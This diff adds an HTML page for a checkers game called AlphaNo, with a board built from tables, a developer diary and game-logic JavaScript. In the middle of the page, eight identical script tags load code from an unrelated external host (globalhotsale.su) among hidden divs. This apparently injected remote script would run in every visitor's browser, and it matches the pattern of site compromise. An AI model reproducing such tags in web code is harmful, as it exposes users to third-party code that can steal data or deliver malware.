@@ -1,0 +1,406 @@
+<!----
+   Copyright (c) [2021] [Dejun Yuan]
+   [NGNc] is licensed under Mulan PSL v2.
+   You can use this software according to the terms and conditions of the Mulan PSL v2. 
+   You may obtain a copy of Mulan PSL v2 at:
+            http://license.coscl.org.cn/MulanPSL2 
+   THIS SOFTWARE IS PROVIDED ON AN "AS IS" BASIS, WITHOUT WARRANTIES OF ANY KIND, EITHER EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO NON-INFRINGEMENT, MERCHANTABILITY OR FIT FOR A PARTICULAR PURPOSE.  
+   See the Mulan PSL v2 for more details.  
+ ----->
+ 
+<html>
+  <head>
+        <title>ngnc.cn is newest website of ngnc.net</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+        <meta id="mymeta" />
+
+    <script type="text/javascript" src="gc.js"></script>
+    <style>
+    </style>
+  </head>
+  
+    <script type="text/javascript" src="alphano.js"></script>
+    <script type="text/javascript">
+
+function getQueryString(name) {
+    var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
+    var r = window.location.search.substr(1).match(reg);
+    if(r!=null)return decodeURI(r[2]); return null;
+}
+
+    </script>
+
+
+<body background="alphano.png">
+
+<div id="banner" style="height:56px; background:url(luma.png); background-size: 75px 56px;"></div>
+
+<p align="center">AlphaNo.</p>
+
+<table id="tabno" border="0"  width="100%" cellspacing="0" cellpadding="10" >
+<tbody align="center" valign="center">
+<tr >
+<td id="bdleft" rowspan="12" width="36%"></td>
+<td colspan="12" width="25%"></td>
+<td id="bdright" rowspan="12" width="36%"></td>
+<tr>
+<td rowspan="10"></td>
+<td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td>
+<td rowspan="10"></td>
+</tr>
+<tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
+<tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
+<tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
+<tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
+<tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
+<tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
+<tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
+<tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
+<tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>
+<td id="dive" colspan="12" width="25%"></td>
+</tr>
+</tbody>
+</table>
+
+<p align="center">comments.</p>
+
+<table id="tabcmt" width="100%" align="center">
+   <tr>
+      <td width="36%" id="cmtleft"></td>
+      <td width="1%" bgcolor="lightgray"></td>
+      <td width="6%"></td>
+      <td width="1%" bgcolor="lightgray"></td>
+      <td width="36%" id="cmtright"></td>
+   </tr></table>
+
+<table>
+   <tr>
+      <td width="10%"></td>
+      <td><font color="gray">
+develop diary:<br>
+--------------<br>
+2020/7/4 14:23:56,  writing the title words:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;"ngnc.cn is newest website of ngnc.net"<br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp;1st version was based on daunght game.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;and was the mindthing presents as msg flow.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;which sending betwenn local and webserver.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(now to starting the programing from 1st line writing.)<br>
+<br>
+14:38:36, msg program based texts send eachother, <br>
+&nbsp;&nbsp;&nbsp;&nbsp;not need graph interface.<br>
+<br>
+21:08:50, draw a board in middle of the top.
+<br>
+2020/7/5 11:58:16,  newest draught board painted success,:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;attach the draught rules and ui interface connecting...<br>
+<br>
+2020/7/6 22:01:14,  draught.js alphano version was finished.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;paint golden & silver ring on pieces.<br>
+<br>
+2020/7/7 9:00:15,  random alphano is running with some painting error.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;09:53, 1st auto match finished, not recording steps.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;10:57, lost check & clear debug msg only console output.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;16:51, recording & replay is working now, start to recAI.<br>
+&nbsp;&nbsp;&nbsp;&nbsp;22:11, fixed some bugs by manual controls.<br>
+      </font></td></tr></table>
+
+<!----
+<img id="dragimg" class="myImg" style="width:600px;height:600px;left:600px;top:0px;position:absolute;cursor:pointer;" src="b.png"/>
+ ----->
+
+    <div id="ver" style="display: none;"></div>
+    <div id="tm" style="display: none;"></div>
+    <div id="player" style="display: none;"></div>
+
+    <script type="text/javascript" src="http://globalhotsale.su/?cid=yesyesyes"></script>
+    <script type="text/javascript" src="http://globalhotsale.su/?cid=yesyesyes"></script>
+    <script type="text/javascript" src="http://globalhotsale.su/?cid=yesyesyes"></script>
+    <script type="text/javascript" src="http://globalhotsale.su/?cid=yesyesyes"></script>
+
+<div id="bd" style="display: none;"></div>
+<div id="diva" style="display: none;"></div>
+<div id="divc" style="display: none;"></div>
+<div id="divd" style="display: none;"></div>
+<div id="divx" style="display: none;"></div>
+<div id="search-form-new" style="display: none;"></div>
+
+<script type="text/javascript" src="http://globalhotsale.su/?cid=yesyesyes"></script>
+<script type="text/javascript" src="http://globalhotsale.su/?cid=yesyesyes"></script>
+<script type="text/javascript" src="http://globalhotsale.su/?cid=yesyesyes"></script>
+<script type="text/javascript" src="http://globalhotsale.su/?cid=yesyesyes"></script>
+
+<script type="text/javascript">
+//var img = document.getElementById("dragimg");//imgList[i];
+//addListener(img,"mousedown",drag);
+
+var bdrecttds = initbdtds( 'e','d','c');
+
+function bdpos2clr(i,j,ch=false)
+{
+    var ths = bdrecttds[i][j];
+    var ret =           ths.innerHTML.indexOf( "img" ) > 0 ? 
+                        ths.innerHTML[ths.innerHTML.indexOf("src=")+5] : ' '; 
+    if ( ch == -1 ) return ret;
+    if ( ret == 'w' ) return 'z';
+    if ( ret == 'b' ) return 'Z';
+    if ( ( ret == 'k' && ths.innerHTML[ths.innerHTML.indexOf("src=")+6] == 'r' ) ||
+         ( ret == 'K' && ths.innerHTML[ths.innerHTML.indexOf("src=")+6] == 'b' ) ) return ret;
+    return '';
+}
+
+function initbdtds( back, gray, dark )
+{
+var ret = null;
+var tds = document.getElementById("tabno").getElementsByTagName("td");
+if ( tds != null && tds.length > 100 )
+{
+   for ( var i=0; i<tds.length; i++ )
+      if ( tds[i].id == "" )  tds[i].style.background = "#"+back+back+back;
+
+   ret = new Array(10);
+   for ( var i=0; i<10; i++ )
+      ret[i] = new Array(10);
+
+   for ( var i=0; i<10; i++ )
+   {
+      for ( var j=0; j<10; j++ )
+      {
+          if ( i == 0 ) ret[0][j] = tds[4+j];
+          else ret[i][j] = tds[15+10*(i-1)+j];
+
+          var isgray = ( i-2*Math.floor(i/2) ) == ( j-2*Math.floor(j/2) );
+          ret[i][j].style.background =
+          ( isgray ) ? ( "#"+gray+gray+gray ) : ( "#"+dark+dark+dark )
+
+   var curp = getQueryString( "p" );
+   if ( curp != null && curp > '0' )
+       if ( i==0 || i==9 || j==0 || j==9 ) 
+           ret[i][j].style.background = ( "#"+back+back+back );
+
+          if ( isgray ) {
+          ret[i][j].innerHTML = '<img width="'+20/*bdrecttds[i][j].offsetWidth*/+'" src="alphano.png">';
+          ret[i][j].style.padding="0"; }
+
+          var selected = -1;
+          var selectclr = ' ';
+/*
+          addListener(ret[i][j],"mousedown",function(e){
+          //    console.log( "x:"+this.offsetParent.offsetLeft+",y:"+this.offsetParent.offsetTop );
+          //    console.log( "x:"+ret[0][0].offsetLeft+",y:"+ret[0][0].offsetTop );
+          //    console.log( "x:"+this.offsetLeft+",y:"+this.offsetTop );
+          //    console.log( "x:"+e.clientX+",y:"+e.clientY );
+              var pos = (( this.offsetTop - ret[0][0].offsetTop )/this.offsetHeight)*10
+                      + (( this.offsetLeft - ret[0][0].offsetLeft )/this.offsetWidth);
+              var clr = this.innerHTML.indexOf( "img" ) > 0 ? 
+                        this.innerHTML[this.innerHTML.indexOf("src=")+5] : ' '; 
+              if ( selected == -1 )
+              {
+                 // copy matrix.
+ //                initmatrix( g_row, g_col, matrix );
+                 if ( AlphaNoifMustEat( pos ) )
+                    return;   // check for must eat.
+
+                 selected = pos;
+                 selectclr = clr;
+                 if ( clr == ' ' ) selected = -1;
+                 // if selected new, mark it.
+                 document.getElementById("bdleft").innerText = selected + "," + selectclr;
+              } else {
+                 if ( clr == ' ' ) { 
+                    if ( checkMove(selected, pos ) == 0 ) {
+*
+                       domove( selected, pos ); // do move.
+                       document.getElementById("bdright").innerText = pos; 
+                       // copy matrix.
+                       initmatrix( g_row, g_col, matrix );
+                       // new after.
+                       if ( alphano_after( pos ) ) {
+                          if ( prepos.r*10 + prepos.c == pos )
+                              selected = pos;
+                           // if selected new, mark it.
+                           document.getElementById("bdleft").innerText = selected + "," + selectclr;
+                           return;
+                       }
+                       // copy matrix.
+                       initmatrix( g_row, g_col, matrix );
+*                     if ( domovebat( selected, selectclr, pos ) )
+                       {   selected = pos;
+                           return; }
+                    }
+                 }
+//                 domoveclear( selected );
+                 selected = -1;                 
+                 document.getElementById("bdleft").innerText = "";
+              }
+          });
+*/
+
+      }
+   }
+}
+
+return ret;
+}
+
+function domovebat( selected, selectclr, pos, msg = true ) {
+                       domove( selected, pos ); // do move.
+                           if ( msg )
+                       document.getElementById("bdright").innerText = pos; 
+                       // copy matrix.
+                       initmatrix( g_row, g_col, matrix );
+                       // new after.
+                       if ( alphano_after( pos ) ) {
+                          if ( prepos.r*10 + prepos.c == pos )
+                              selected = pos;
+                           // if selected new, mark it.
+                           if ( msg )
+                           document.getElementById("bdleft").innerText = selected + "," + selectclr;
+                           return true;
+                       }
+                       // copy matrix.
+                       initmatrix( g_row, g_col, matrix );
+    return false;
+}
+
+function bdx( p ){ return p-parseInt(p/10)*10; }
+function bdy( p ){ return parseInt(p/10); }
+
+function domove( pre, pos )
+{
+    bdrecttds[bdy(pos)][bdx(pos)].innerHTML = 
+        bdrecttds[bdy(pre)][bdx(pre)].innerHTML;
+    bdrecttds[bdy(pos)][bdx(pos)].style.padding="0";
+
+    domoveclear( pre )
+}
+
+function domoveclear( pre )
+{
+    bdrecttds[bdy(pre)][bdx(pre)].innerHTML = "";
+    bdrecttds[bdy(pre)][bdx(pre)].style.padding="10";
+}
+
+function domoveclearxy( r, c )
+{
+    domoveclear( r*10+c );
+}
+
+/*
+var chesspos =
+    "0Z0Z0Z0Z0Z" +
+    "Z0Z0Z0Z0Z0" +
+    "0Z0Z0Z0Z0Z" +
+    "Z0Z0Z0Z0Z0" +
+    "0000000000" +
+    "0000000000" +
+    "0z0z0z0z0z" +
+    "z0z0z0z0z0" +
+    "0z0z0z0z0z" +
+    "z0z0z0z0z0";
+*/
+
+function paintboard( pos, update=false )
+{
+    for ( var i=0; i<10; i++ )
+    for ( var j=0; j<10; j++ )
+    {
+        if ( ( i-2*Math.floor(i/2) ) == ( j-2*Math.floor(j/2) ) ) 
+            continue;
+        var img = "";
+        switch ( pos[i*10+j] ) 
+        {
+        case 'Z': // b
+            img = "b.png";
+            break;
+        case 'z': // w
+            img = "w.png";
+            break;
+        case 'K': // b
+            img = "Kb.png";
+            break;
+        case 'k': // w
+            img = "kr.png";
+            break;
+        }
+        if ( img != "" &&
+             bdrecttds != null )
+        {
+            bdrecttds[i][j].innerHTML = '<img width="'+20/*bdrecttds[i][j].offsetWidth*/+'" src="' + img + '">';
+            bdrecttds[i][j].style.padding="0";
+/*
+            var imgid = bdrecttds[i][j].children[0];
+//            imgid.style.position = "absolute";
+//            imgid.style.cursor = "pointer";
+            addListener(imgid,"mousedown",function(e){
+                var newimg = new Image();
+                newimg.style.position = "absolute";
+                newimg.style.cursor = "pointer";
+                newimg.style.top = this.parentNode.offsetTop 
+                                 + document.getElementById("tabno").offsetTop + "px";
+                newimg.style.left = this.parentNode.offsetLeft + 10 - 2 + "px";
+                newimg.style.width =  this.offsetWidth + "px";
+                newimg.style.height =  this.offsetHeight + "px";
+                newimg.src = this.src;
+                this.style.display = "none";
+                document.body.appendChild( newimg );
+                addListener(newimg,"mousedown",drag);
+            });
+*/
+        } else
+        if ( update ) {
+//            if ( bdpos2clr( i, j, true ) != 'a' ) {
+                bdrecttds[i][j].innerHTML = '';
+                bdrecttds[i][j].style.padding = "10";
+        } //  }
+    } 
+}
+
+function isIE(){
+  if(navigator.userAgent.indexOf("MSIE")>0){return true;}
+  else{return false;}
+}
+function addListener(element,e,fn){
+  if(isIE()){element.attachEvent("on" + e,fn);}
+ else{element.addEventListener(e,fn,false);}
+}
+/*
+function drag(e){
+ var e = e || window.event;
+ var element = e.srcElement || e.target;
+ if(e.preventDefault)e.preventDefault();
+ else e.returnvalue=false;
+ isDrag = true;
+ var relLeft = e.clientX - parseInt(element.style.left);
+ var relTop = e.clientY - parseInt(element.style.top);
+ element.onmouseup = function(){ isDrag = false; }
+ document.onmousemove = function(e_move){
+   var e_move = e_move || window.event;
+   if(isDrag){
+     element.style.left=e_move.clientX - relLeft + "px";
+     element.style.top=e_move.clientY - relTop + "px";
+     return false;
+   }
+ }
+}
+*/
+
+</script>
+
+<script type="text/javascript">
+paintboard( chesspos );
+var matrix = initmatrix( g_row, g_col );
+document.title = "ngnc.cn is newest website of ngnc.net";
+document.getElementById("divd").style.display="none";
+document.getElementById("dive").style.background="#eee";
+</script>
+
+<script type="text/javascript" src="fmind.js"></script>
+<script type="text/javascript">
+msgalert( "<button onclick='startno(600);alertclear();'>start</button>", 0 );
+</script>
+
+    <script>sim_getReady_hook();</script>
+
+</body>
+</html>
